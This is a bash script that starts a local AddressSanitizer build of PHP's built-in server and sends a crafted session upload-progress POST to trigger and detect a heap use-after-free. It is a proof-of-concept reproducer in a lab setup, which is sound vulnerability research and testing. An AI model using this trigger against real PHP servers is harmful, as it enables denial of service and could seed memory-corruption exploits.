set -euo pipefail
PHP=${1:?asan php binary}
PORT=${2:-8176}
HERE="$(cd "$(dirname "$0")" && pwd)"
SESS=$(mktemp -d)
INI=$(mktemp)
cat > "$INI" <<INI
session.save_path = "$SESS"
memory_limit = 6M
session.upload_progress.enabled = 1
session.upload_progress.cleanup = 1
session.upload_progress.freq = "1%"
session.upload_progress.min_freq = 1
display_errors = 1
INI
LOG=$(mktemp)
USE_ZEND_ALLOC=0 USE_TRACKED_ALLOC=1 ASAN_OPTIONS=detect_leaks=0 \
  "$PHP" -c "$INI" -S "127.0.0.1:$PORT" -t "$HERE/../lab/webroot" >"$LOG" 2>&1 &
PID=$!
sleep 1
curl -sS -m 5 "http://127.0.0.1:$PORT/sample.php" -o /dev/null || true
curl -sS -m 5 -X POST "http://127.0.0.1:$PORT/index.php" \
  -H "Cookie: PHPSESSID=uaf$RANDOM" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" -F "f=@/etc/hosts" -o /dev/null || true
sleep 0.7
kill "$PID" 2>/dev/null || true
if grep -q "heap-use-after-free" "$LOG"; then
  echo "[+] UAF reproduced:"
  grep -m1 -A8 "ERROR: AddressSanitizer" "$LOG"
else
  echo "[-] no UAF; log: $LOG"
  tail -20 "$LOG"
fi
